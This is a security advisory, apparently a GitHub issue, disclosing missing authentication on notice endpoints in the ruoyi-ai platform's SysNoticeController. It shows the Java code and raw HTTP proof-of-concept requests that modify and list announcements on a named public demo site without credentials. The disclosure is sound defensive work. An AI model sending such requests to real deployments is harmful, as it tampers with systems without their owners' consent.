# Vulnerability Description

The SysNoticeController component of the open source full-stack AI development platform project "https://github.com/ageerle/ruoyi-ai" has an unauthorized access vulnerability. Attackers can modify and query the notification information sent to users by this management system without any access credentials.
- Vulnerability Discloser: [Tr0e](https://github.com/Tr0e)
  
- Vendors:  [ageerle](https://github.com/ageerle/ruoyi-ai)
  
- Source code address： [GitHub-ageerle/ruoyi-ai](https://github.com/ageerle/ruoyi-ai)
  
- Related reports online link: https://github.com/ageerle/ruoyi-ai/issues/44
  

Since the author did not release the Release package, I cannot distinguish the version number. I performed security testing based on the latest code of 20250329. Note: **This vulnerability was discovered automatically by my AI code audit tool**.

# Vulnerability Analysis

The vulnerability code entry point is located at：

https://github.com/ageerle/ruoyi-ai/blob/main/ruoyi-modules/ruoyi-system/src/main/java/org/ruoyi/system/controller/system/SysNoticeController.java

The complete relevant code information of the vulnerability exploit chain is as follows:

```java
//ruoyi-modules/ruoyi-system/src/main/java/org/ruoyi/system/controller/system/SysNoticeController.java
    /**
     * 获取公告列表
     */
    @GetMapping("/list")
    public TableDataInfo<SysNoticeVo> list(SysNoticeBo notice, PageQuery pageQuery) {
        //公告类型（1通知 2公告）
        notice.setNoticeType("2");
        return noticeService.selectPageNoticeList(notice, pageQuery);
    }

    /**
     * 获取通知信息
     */
    @GetMapping("/getNotice")
    public R<SysNotice> getNotice(SysNoticeBo notice) {
        return R.ok(noticeService.getNotice(notice));
    }

    /**
     * 修改通知公告
     */
    @Log(title = "通知公告", businessType = BusinessType.UPDATE)
    @PutMapping
    public R<Void> edit(@Validated @RequestBody SysNoticeBo notice) {
        return toAjax(noticeService.updateNotice(notice));
    }
```

Although this system has authenticated sensitive API interfaces to prevent illegal access, the above-mentioned API interfaces used to modify and query system announcement information can still be accessed by illegal persons.

Attackers can access the above API interfaces effortlessly, damaging the confidentiality, integrity and availability of the system.

# Vulnerability Verification

Please first build the project local environment according to the steps provided by the project source code author in the Readme file. Or directly visit the public demonstration site provided by the author: https://admin.pandarobot.chat/ .

Take the API interface for modifying system announcements as an example. The vulnerability proof of concept (POC) is as follows:

```js
PUT /prod-api/system/notice HTTP/2
Host: admin.pandarobot.chat
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/json, text/plain, */*
Accept-Language: zh_CN
Accept-Encoding: gzip, deflate, br
Content-Type: application/json;charset=utf-8
Authorization: 
Clientid: 
Content-Length: 121
Origin: https://admin.pandarobot.chat
Referer: https://admin.pandarobot.chat/system/notice
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{"status":"0","noticeType":"2","noticeId":"1904428576849305602","noticeTitle":"Hello","noticeContent":"My name is Tr0e."}
```

You can see that the announcement information has been successfully modified without any authentication credentials.

![Image](https://github.com/user-attachments/assets/552ea7c8-dbee-4270-89db-9c5400f052c4)

We can also verify whether the above modification is successful by querying the system announcement information list. The query interface also has an unauthorized access vulnerability.
```js
GET /prod-api/system/notice/list HTTP/2
Host: admin.pandarobot.chat
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/json, text/plain, */*
Accept-Language: zh_CN
Accept-Encoding: gzip, deflate, br
Authorization: 
Clientid: 
Referer: https://admin.pandarobot.chat/system/role
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

```

![Image](https://github.com/user-attachments/assets/21367f7e-c26e-48b1-a236-91419d1a2b49)

![Image](https://github.com/user-attachments/assets/2719a31b-89fd-4cfa-b4b0-7d8e5fe1f7fc)

# Security Suggestions

Add permission control to relevant API interfaces.
